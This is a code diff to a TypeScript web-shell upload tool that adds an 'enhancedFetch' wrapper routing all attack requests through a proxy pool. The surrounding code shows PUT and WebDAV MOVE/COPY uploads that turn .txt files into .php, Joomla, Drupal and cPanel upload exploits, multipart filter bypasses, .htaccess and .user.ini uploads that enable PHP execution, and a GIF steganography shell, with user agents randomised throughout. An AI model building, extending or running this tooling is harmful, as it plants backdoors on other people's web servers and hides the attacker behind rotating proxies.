@@ -17,6 +17,19 @@ import type { PreScreenResult } from "./ai-prescreening";
 import type { ProgressCallback, ErrorCategory } from "./one-click-deploy";
 import { fetchWithPoolProxy } from "./proxy-pool";
 
+// Helper: wrap fetch with proxy pool
+async function enhancedFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  try {
+    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+    return response;
+  } catch (e) {
+    // Fallback to direct fetch if proxy fails
+    return fetch(url, init);
+  }
+}
+
+
 // ─── Types ───
 
 export interface EnhancedUploadResult {
@@ -974,7 +987,7 @@ async function chunkedUpload(
     const controller = new AbortController();
     const t = setTimeout(() => controller.abort(), timeout);
 
-    const res = await fetch(`${targetUrl}${path}${filename}`, {
+    const res = await enhancedFetch(`${targetUrl}${path}${filename}`, {
       method: "PUT",
       headers: {
         ...headers,
@@ -989,7 +1002,7 @@ async function chunkedUpload(
 
     if (res.status < 400) {
       // Verify
-      const checkRes = await fetch(`${targetUrl}${path}${filename}`, {
+      const checkRes = await enhancedFetch(`${targetUrl}${path}${filename}`, {
         headers: { "User-Agent": randomUA() },
         signal: AbortSignal.timeout(5000),
         redirect: "manual",
@@ -1129,7 +1142,7 @@ async function tryHttpMoveCopy(
 
   try {
     // Step 1: Upload as .txt (usually allowed)
-    const putRes = await fetch(`${targetUrl}${path}${safeName}`, {
+    const putRes = await enhancedFetch(`${targetUrl}${path}${safeName}`, {
       method: "PUT",
       body: content,
       headers: {
@@ -1143,7 +1156,7 @@ async function tryHttpMoveCopy(
       // Step 2: MOVE to .php
       for (const method of ["MOVE", "COPY"]) {
         try {
-          const moveRes = await fetch(`${targetUrl}${path}${safeName}`, {
+          const moveRes = await enhancedFetch(`${targetUrl}${path}${safeName}`, {
             method,
             headers: {
               "Destination": `${targetUrl}${path}${filename}`,
@@ -1155,7 +1168,7 @@ async function tryHttpMoveCopy(
 
           if (moveRes.status < 400) {
             // Verify
-            const checkRes = await fetch(`${targetUrl}${path}${filename}`, {
+            const checkRes = await enhancedFetch(`${targetUrl}${path}${filename}`, {
               headers: { "User-Agent": randomUA() },
               signal: AbortSignal.timeout(5000),
               redirect: "manual",
@@ -1215,7 +1228,7 @@ async function tryJoomlaExploits(
       formData.append("file", blob, filename);
       formData.append("path", "images");
 
-      const res = await fetch(`${targetUrl}${endpoint}`, {
+      const res = await enhancedFetch(`${targetUrl}${endpoint}`, {
         method: "POST",
         body: formData,
         headers: {
@@ -1273,7 +1286,7 @@ async function tryDrupalExploits(
 
   for (const endpoint of endpoints) {
     try {
-      const res = await fetch(`${targetUrl}${endpoint}`, {
+      const res = await enhancedFetch(`${targetUrl}${endpoint}`, {
         method: "POST",
         body: content,
         headers: {
@@ -1345,7 +1358,7 @@ async function tryCpanelFileManager(
       try {
         const authHeader = "Basic " + Buffer.from(`${cred.user}:${cred.pass}`).toString("base64");
 
-        const res = await fetch(`${cpanelUrl}/execute/Fileman/upload_files`, {
+        const res = await enhancedFetch(`${cpanelUrl}/execute/Fileman/upload_files`, {
           method: "POST",
           headers: {
             "Authorization": authHeader,
@@ -1428,7 +1441,7 @@ export async function multiVectorParallelUpload(
           const start = Date.now();
           try {
             config.onMethodProgress?.(`PUT+${strategy.name}`, `Trying PUT ${path} with ${strategy.description}...`);
-            const res = await fetch(`${config.targetUrl}${path}${config.fileName}`, {
+            const res = await enhancedFetch(`${config.targetUrl}${path}${config.fileName}`, {
               method: "PUT",
               body: config.fileContent,
               headers: {
@@ -1467,7 +1480,7 @@ export async function multiVectorParallelUpload(
             try {
               config.onMethodProgress?.(`POST+${mpTechnique}`, `Trying multipart ${mpTechnique} on ${path}...`);
               const mp = generateManipulatedMultipart(config.fileContent, config.fileName, mpTechnique);
-              const res = await fetch(`${config.targetUrl}${path}`, {
+              const res = await enhancedFetch(`${config.targetUrl}${path}`, {
                 method: "POST",
                 body: mp.body,
                 headers: {
@@ -1533,7 +1546,7 @@ export async function multiVectorParallelUpload(
 
           // Upload .htaccess first
           const htaccessContent = generateHtaccessPhpExec();
-          await fetch(`${config.targetUrl}${path}.htaccess`, {
+          await enhancedFetch(`${config.targetUrl}${path}.htaccess`, {
             method: "PUT",
             body: htaccessContent,
             headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
@@ -1541,7 +1554,7 @@ export async function multiVectorParallelUpload(
           });
 
           // Upload .user.ini
-          await fetch(`${config.targetUrl}${path}.user.ini`, {
+          await enhancedFetch(`${config.targetUrl}${path}.user.ini`, {
             method: "PUT",
             body: generateUserIni(),
             headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
@@ -1550,7 +1563,7 @@ export async function multiVectorParallelUpload(
 
           // Upload GIF steganography shell
           const stegoShell = generateSteganographyShell(randomStr(16));
-          const putRes = await fetch(`${config.targetUrl}${path}${stegoShell.filename}`, {
+          const putRes = await enhancedFetch(`${config.targetUrl}${path}${stegoShell.filename}`, {
             method: "PUT",
             body: new Uint8Array(stegoShell.content),
             headers: { "Content-Type": stegoShell.contentType, "User-Agent": randomUA() },
@@ -1684,7 +1697,7 @@ export async function smartRetryUpload(
 
 async function quickVerify(url: string): Promise<boolean> {
   try {
-    const res = await fetch(url, {
+    const res = await enhancedFetch(url, {
       headers: { "User-Agent": randomUA() },
       signal: AbortSignal.timeout(5000),
       redirect: "manual",
